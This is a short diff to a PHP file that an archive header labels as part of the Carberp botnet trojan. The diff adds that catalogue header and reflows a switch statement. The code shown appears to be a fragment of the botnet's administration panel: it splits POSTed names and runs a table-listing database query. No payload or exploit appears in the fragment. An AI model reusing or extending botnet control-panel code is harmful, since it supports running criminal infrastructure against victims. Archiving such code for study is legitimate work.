@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $page['count_page'] = 25;
@@ -14,7 +25,8 @@ function start($row){
 if(!empty($_POST['name'])){
 	$names = explode("\r\n", $_POST['name']);
 	if(count($names) > 0){
-		switch($_POST['mode']){			case '2':
+		switch($_POST['mode']){
+			case '2':
             	$mysqli->query('SHOW TABLES FROM adm_unnecessary', null, 'start_list');
 			break;
 
